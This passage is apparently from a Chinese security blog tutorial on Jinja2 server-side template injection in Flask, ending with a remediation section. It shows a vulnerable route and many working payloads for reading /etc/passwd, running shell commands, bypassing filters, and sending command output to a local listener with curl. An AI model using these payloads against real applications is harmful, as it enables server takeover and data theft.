class=\"line\">&#123;% set c = &#x27;sxq&#x27; %&#125;</span><br><span class=\"line\">&#123;% if 1==1 %&#125;Zh1z3ven&#123;%endif%&#125;</span><br><span class=\"line\">&#123;% for i in [1, 2, 3] %&#125;sxq&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>\n<p>{{##}}：注释</p>\n<p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。</p>\n<p>此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量 name 的值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"><span class=\"keyword\">from</span> jinja2 <span class=\"keyword\">import</span> Template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    name = request.args.get(<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Template(<span class=\"string\">&quot;Hello &quot;</span> + name)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> t.render()\t<span class=\"comment\">#render()实现渲染</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上述代码存在 SSTI 漏洞</p>\n<h4 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<p>Jinja2 可以直接访问 python 的一些对象及其方法，所以可以通过构造继承链 (基类 —&gt; 子类 —&gt; 危险方法) 来执行一些操作，比如文件读取，命令执行等</p>\n<h5 id=\"内置类属性和方法\"><a class=\"anchor\" href=\"#内置类属性和方法\">#</a> 内置类属性和方法</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"string\">&quot;&quot;</span>.__class__</span><br><span class=\"line\">&lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;str&#x27;</span>&gt;</span><br><span class=\"line\"><span class=\"comment\">#返回对象所属的类</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"string\">&quot;&quot;</span>.__class__.__bases__</span><br><span class=\"line\">(&lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;object&#x27;</span>&gt;,)</span><br><span class=\"line\"><span class=\"comment\">#以元组的形式返回一个类所直接继承的类(父类)/大多是获取基类(object)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"string\">&quot;&quot;</span>.__class__.__base__</span><br><span class=\"line\">&lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;object&#x27;</span>&gt;</span><br><span class=\"line\"><span class=\"comment\">#和__bases__一样，但是以字符串形式返回父类</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt; <span class=\"string\">&quot;&quot;</span>.__class__.__mro__</span><br><span class=\"line\">(&lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;str&#x27;</span>&gt;, &lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;object&#x27;</span>&gt;)</span><br><span class=\"line\"><span class=\"comment\">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</span></span><br><span class=\"line\"><span class=\"comment\">#__base__和__mro__都是用来寻找基类的</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;<span class=\"string\">&quot;&quot;</span>.__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()</span><br><span class=\"line\">[&lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;type&#x27;</span>&gt;, &lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;weakref&#x27;</span>&gt;, ..., &lt;<span class=\"keyword\">class</span> <span class=\"string\">&#x27;rlcompleter.Completer&#x27;</span>&gt;]</span><br><span class=\"line\"><span class=\"comment\">#以列表返回类的子类</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__init__</span><br><span class=\"line\"><span class=\"comment\">#类的初始化方法，所有的可被当作模块导入的都包含 __init__方法，通过此方法来调用 __globals__方法</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__globals__</span><br><span class=\"line\"><span class=\"comment\">#所有函数都会有一个 __globals__ 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py2下</span><br><span class=\"line\">__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如<span class=\"built_in\">int</span>()，<span class=\"built_in\">list</span>()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是<span class=\"built_in\">dir</span>(__builtins__)　　</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py3下</span><br><span class=\"line\">__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　</span><br><span class=\"line\"><span class=\"number\">1.</span>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　<span class=\"number\">2.</span>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>\n<h5 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h5>\n<p>思路</p>\n<p>1、随便找一个内置类对象利用  <code>__class__</code> 拿到该对象所对应的类</p>\n<p>2、用  <code>__bases__</code>  或  <code>__mro__</code>  拿到基类  <code>&lt;class 'object'&gt;</code></p>\n<p>3、用  <code>__subclasses__()</code>  获取所有子类</p>\n<p>4、在子类中寻找可以合适的继承链执行命令或读取文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>.__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()</span><br><span class=\"line\">().__class__.__mro__[<span class=\"number\">2</span>].__subclasses__()</span><br><span class=\"line\">().__class__.__mro__[-<span class=\"number\">1</span>].__subclasses__()</span><br><span class=\"line\">request.__class__.__mro__[<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n<p>例子</p>\n<p>用 file 对象读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class=\"line\">    if(c.__name__==&#x27;file&#x27;):</span><br><span class=\"line\">        print(c)</span><br><span class=\"line\">        print c(&#x27;etc/passwd&#x27;).readlines()</span><br></pre></td></tr></table></figure>\n<p>上述代码先通过 <code>__class__</code> 获取字典对象所属的类，再通过 <code>__base__（__bases[0]__）</code> 拿到基类，然后使用 <code>__subclasses__()</code>  获取子类列表，在子类列表中直接寻找可以利用的类</p>\n<p>因此利用 {{%%}} 构造 payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> c.__name__==<span class=\"string\">&#x27;file&#x27;</span> %&#125;</span><br><span class=\"line\">&#123;&#123; c(<span class=\"string\">&quot;/etc/passwd&quot;</span>).readlines() &#125;&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>注意，py3 移除了 file 子类，因此 file 只能在 py2 中使用</p>\n<p>上面的例子使用 file 模块读取文件，我们也可以使用 <code>__globals__</code> 找其他的模块，类，变量等来构造 payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num = -<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ().__class__.__bases__[<span class=\"number\">0</span>].__subclasses__():</span><br><span class=\"line\">    num += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;os&#x27;</span> <span class=\"keyword\">in</span> i.__init__.__globals__.keys(): <span class=\"comment\">#os也可以换成其他的</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i, num)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span> </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240304125600322.png\" alt=\"image-20240304125600322\"></p>\n<p>找到之后就能构造 payload (任意一种)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">().__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">144</span>].__init__.__globals__[<span class=\"string\">&#x27;os&#x27;</span>].system(<span class=\"string\">&#x27;whoami&#x27;</span>)</span><br><span class=\"line\">().__class__.__base__.__subclasses__()[<span class=\"number\">144</span>].__init__.__globals__[<span class=\"string\">&#x27;os&#x27;</span>].system(<span class=\"string\">&#x27;whoami&#x27;</span>)</span><br><span class=\"line\">().__class__.__mro__[<span class=\"number\">1</span>].__subclasses__()[<span class=\"number\">144</span>].__init__.__globals__[<span class=\"string\">&#x27;os&#x27;</span>].system(<span class=\"string\">&#x27;whoami&#x27;</span>)</span><br><span class=\"line\">().__class__.__mro__[<span class=\"number\">1</span>].__subclasses__()[<span class=\"number\">144</span>].__init__.__globals__[<span class=\"string\">&#x27;os&#x27;</span>].system(<span class=\"string\">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>使用 <code>__builtins__</code> 也能达到同样的效果</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num = -<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ().__class__.__bases__[<span class=\"number\">0</span>].__subclasses__():</span><br><span class=\"line\">    num += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i.__init__.__globals__.keys())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;__builtins__&#x27;</span> <span class=\"keyword\">in</span> i.__init__.__globals__.keys():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i, num)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>输出结果很多，就不展示了，选择一个，然后</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">().__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">64</span>].__init__.__globals__[<span class=\"string\">&#x27;__builtins__&#x27;</span>][<span class=\"string\">&#x27;eval&#x27;</span>](<span class=\"string\">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>\n<h5 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 payload</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python 2.7</span></span><br><span class=\"line\"><span class=\"comment\">#文件操作</span></span><br><span class=\"line\"><span class=\"comment\">#找到file类</span></span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">40</span>]</span><br><span class=\"line\"><span class=\"comment\">#读文件</span></span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">40</span>](<span class=\"string\">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class=\"line\"><span class=\"comment\">#写文件</span></span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">40</span>](<span class=\"string\">&#x27;/tmp&#x27;</span>).write(<span class=\"string\">&#x27;test&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#命令执行</span></span><br><span class=\"line\"><span class=\"comment\">#os执行</span></span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.func_globals.linecache.os.popen(<span class=\"string\">&#x27;id&#x27;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#eval,impoer等全局函数</span></span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__.__builtins__下有<span class=\"built_in\">eval</span>，<span class=\"built_in\">__import__</span>等的全局函数，可以利用此来执行命令：</span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__[<span class=\"string\">&#x27;__builtins__&#x27;</span>][<span class=\"string\">&#x27;eval&#x27;</span>](<span class=\"string\">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__.__builtins__.<span class=\"built_in\">eval</span>(<span class=\"string\">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__.__builtins__.<span class=\"built_in\">__import__</span>(<span class=\"string\">&#x27;os&#x27;</span>).popen(<span class=\"string\">&#x27;id&#x27;</span>).read()</span><br><span class=\"line\">[].__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__[<span class=\"string\">&#x27;__builtins__&#x27;</span>][<span class=\"string\">&#x27;__import__&#x27;</span>](<span class=\"string\">&#x27;os&#x27;</span>).popen(<span class=\"string\">&#x27;id&#x27;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#python3.7</span></span><br><span class=\"line\"><span class=\"comment\">#命令执行</span></span><br><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class=\"keyword\">if</span> c.__name__==<span class=\"string\">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class=\"string\">&#x27;__builtins__&#x27;</span>].<span class=\"built_in\">eval</span>(<span class=\"string\">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\"><span class=\"comment\">#文件操作</span></span><br><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class=\"keyword\">if</span> c.__name__==<span class=\"string\">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class=\"string\">&#x27;__builtins__&#x27;</span>].<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;filename&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\"><span class=\"comment\">#windows下的os命令</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span>.__class__.__bases__[<span class=\"number\">0</span>].__subclasses__()[<span class=\"number\">118</span>].__init__.__globals__[<span class=\"string\">&#x27;popen&#x27;</span>](<span class=\"string\">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>\n<h4 id=\"waf绕过方式\"><a class=\"anchor\" href=\"#waf绕过方式\">#</a> WAF 绕过方式</h4>\n<h5 id=\"过滤\"><a class=\"anchor\" href=\"#过滤\">#</a> 过滤 [</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#getitem、pop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class=\"number\">2</span>).__subclasses__().pop(<span class=\"number\">40</span>)(<span class=\"string\">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class=\"number\">2</span>).__subclasses__().pop(<span class=\"number\">59</span>).__init__.func_globals.linecache.os.popen(<span class=\"string\">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>\n<h5 id=\"过滤-2\"><a class=\"anchor\" href=\"#过滤-2\">#</a> 过滤’</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#chr函数</span></span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__.__builtins__.<span class=\"built_in\">chr</span> %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__().pop(<span class=\"number\">40</span>)(<span class=\"built_in\">chr</span>(<span class=\"number\">47</span>)%2bchr(<span class=\"number\">101</span>)%2bchr(<span class=\"number\">116</span>)%2bchr(<span class=\"number\">99</span>)%2bchr(<span class=\"number\">47</span>)%2bchr(<span class=\"number\">112</span>)%2bchr(<span class=\"number\">97</span>)%2bchr(<span class=\"number\">115</span>)%2bchr(<span class=\"number\">115</span>)%2bchr(<span class=\"number\">119</span>)%2bchr(<span class=\"number\">100</span>)).read()&#125;&#125;<span class=\"comment\">#request对象</span></span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__().pop(<span class=\"number\">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class=\"line\"><span class=\"comment\">#命令执行</span></span><br><span class=\"line\">&#123;% <span class=\"built_in\">set</span> <span class=\"built_in\">chr</span>=().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__()[<span class=\"number\">59</span>].__init__.__globals__.__builtins__.<span class=\"built_in\">chr</span> %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__().pop(<span class=\"number\">59</span>).__init__.func_globals.linecache.os.popen(<span class=\"built_in\">chr</span>(<span class=\"number\">105</span>)%2bchr(<span class=\"number\">100</span>)).read() &#125;&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__bases__.__getitem__(<span class=\"number\">0</span>).__subclasses__().pop(<span class=\"number\">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=<span class=\"built_in\">id</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h5 id=\"过滤_\"><a class=\"anchor\" href=\"#过滤_\">#</a> 过滤_</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h5 id=\"过滤-3\"><a class=\"anchor\" href=\"#过滤-3\">#</a> 过滤 {}</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#用&#123;%%&#125;标记</span><br><span class=\"line\">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>\n<p>利用实例</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> c.__name__ == <span class=\"string\">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class=\"line\">    &#123;% <span class=\"keyword\">if</span> <span class=\"string\">&#x27;eval&#x27;</span> <span class=\"keyword\">in</span> b.keys() %&#125;</span><br><span class=\"line\">      &#123;&#123; b[<span class=\"string\">&#x27;eval&#x27;</span>](<span class=\"string\">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;         //popen的参数就是要执行的命令</span><br><span class=\"line\">    &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endfor %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"漏洞修复\"><a class=\"anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h4>\n<p>1、render_template ()：扩展名为  <code>.html</code>  、  <code>.htm</code>  、  <code>.xml</code>  和  <code>.xhtml</code>  的模板中开启自动转义</p>\n<p>2、render_template_string ()：字符串开启自动转义</p>\n<p>3、不用将参数交给用户控制</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> render_template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/index&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    user = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;name&#x27;</span> : <span class=\"string\">&#x27;sxq&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, title=<span class=\"string\">&#x27;Home&#x27;</span>, user=user)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 